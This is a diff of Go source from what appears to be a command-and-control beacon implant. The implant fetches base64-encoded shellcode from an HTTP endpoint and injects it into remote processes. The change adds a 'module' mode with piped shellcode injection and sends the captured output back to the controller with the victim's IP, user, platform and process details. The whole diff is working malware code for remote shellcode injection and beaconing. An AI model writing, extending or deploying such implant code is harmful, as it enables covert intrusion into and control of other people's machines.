@@ -63,24 +63,34 @@ func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
 
 func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 	for i := 0; i < len(commResp.Shellcode); i += 2 {
+		var output string
+		procId := -1
 		shellcode := commResp.Shellcode[i]
 		procInfo := strings.Split(commResp.Shellcode[i+1], " ")
-		procId, err := strconv.Atoi(procInfo[1])
-
-		if err != nil {
-			debugFatal(err)
-			continue
+		
+		if procInfo[0] != "module" {
+			procId, _ = strconv.Atoi(procInfo[1])
 		}
 		
 		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)
-		
+
 		if err != nil {
 			debugFatal(err)
 			continue
 		}
 
-		si := RemoteShellcodeInjector {decodedShellcode, procId}
-		err = si.inject()
+		if procInfo[0] != "module" {
+			si := RemoteShellcodeInjector { decodedShellcode, procId }
+			err := si.inject()
+			if err != nil {
+				output = err.Error()
+			} else {
+				output = ""
+			}
+		} else {
+			si := RemotePipedShellcodeInjector { decodedShellcode, strings.Join(procInfo[1:], " ") }
+			output = si.inject()
+		}
 		
 		var data []byte
 				
@@ -94,8 +104,10 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 			}
 
 			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"migrate",[]byte(msg)})
+		} else if procInfo[0] == "module" {
+			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
 		} else {
-			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(err.Error())})
+			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
 		}
 
 		debugFatal(err)
